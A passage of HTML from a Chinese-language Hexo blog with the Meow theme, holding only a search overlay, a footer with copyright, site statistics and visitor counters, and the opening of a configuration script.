src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div class="search-overlay"><div class="search-container"><div class="search-header"><div class="search-title"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg>
+搜索</div><div class="search-close-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 21a9 9 0 0 0 9 -9a9 9 0 0 0 -9 -9a9 9 0 0 0 -9 9a9 9 0 0 0 9 9z" /><path d="M9 8l6 8" /><path d="M15 8l-6 8" /></svg></div></div><div class="search-input-box"><input id="search-input" type="search" placeholder="请输入关键词进行站内搜索……" value="" maxlength="80"/></div><div class="search-result-container"><div class="search-result-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg></div></div></div></div></main><footer><div class="footer"><div id="footer-copyright">© 2024 - 2026 <span>💗</span> <a href="/null">Regulus</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.2.0" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2024-04-02T22:16:20.000Z">🌻已稳定运行.年.月.天</span></div></div><div id="footer-statistic"><span>共撰写170篇文章，全站共471.8k字</span></div><div id="footer-pageview"><div id="container_site_pv"><span>🔥总访问量</span><span id="vercount_value_site_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div><div id="container_site_uv"><span>🐈访客人数</span><span id="vercount_value_site_uv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
   root: '/',
   toolbar: true,
   lazyload_src: '/assets/images/Meow-Loading.webp',
